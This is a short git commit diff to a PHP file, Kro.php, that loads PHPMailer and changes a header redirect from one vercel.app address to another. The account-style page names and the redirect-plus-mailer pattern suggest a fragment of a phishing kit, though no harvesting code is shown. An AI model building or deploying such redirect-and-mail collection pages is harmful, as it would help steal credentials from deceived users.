a28f99a64701ba1d9d4daae19de807e6d6fbc922
Ghaliya3399 <ghaliyaaliyounisaneza@gmail.com>
2025-08-31 15:32:42 +0500

    Update Kro.php

--- Kro.php
+++ Kro.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://page-contact-account-infe.vercel.app/");
+header("Location: https://amazing-data-appely.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
